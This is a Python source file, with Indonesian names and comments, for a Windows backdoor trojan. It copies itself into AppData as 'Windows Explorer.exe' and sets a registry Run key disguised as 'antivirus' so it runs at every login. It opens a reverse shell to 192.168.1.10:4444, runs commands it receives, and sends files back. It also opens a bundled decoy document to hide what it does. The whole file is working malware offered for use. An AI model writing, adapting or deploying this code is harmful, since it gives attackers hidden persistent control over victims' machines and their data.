import subprocess
import socket
import json
import os
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.nih_persisten()
        self.koneksi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.koneksi.connect((ip,port))

    def nih_persisten(self):
        lokasi_file_jahat = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(lokasi_file_jahat):    
            shutil.copyfile(sys.executable, lokasi_file_jahat)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v antivirus /t REG_SZ /d "' + lokasi_file_jahat + '"',shell=True)

    def perintah_sistem_eksekusi(self,perintah):
        return subprocess.check_output(perintah, shell=True, stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

    def pengubah_direktori_ke(self,path):
        os.chdir(path)
        return path

    def read_file(self,path):
        with open(path,'rb') as file:
            return file.read()

    def jalankan(self):
        while True:
            perintah = self.koneksi.recv(1024)
            data = json.loads(perintah)
            if data[0] == 'exit':
                self.koneksi.close()
                exit()
            elif data[0] =='cd' and len(data[0]) > 1:
                hasil_perintah = self.pengubah_direktori_ke(data[1].encode())
            elif data[0] == 'download':
                hasil_perintah = self.read_file(data[1])
            else:    
                hasil_perintah = self.perintah_sistem_eksekusi(data)

            self.koneksi.send(hasil_perintah)

        koneksi.close()

# ini masukan nya sesuai nama filenya oke 
nama_file = sys._MEIPASS + "\A1_2_Sejarahkomputer"
subprocess.Popen(nama_file,shell=True)

try:
    my_backdoor = Backdoor("192.168.1.10",4444)
    my_backdoor.jalankan()
except Exception:
    sys.exit()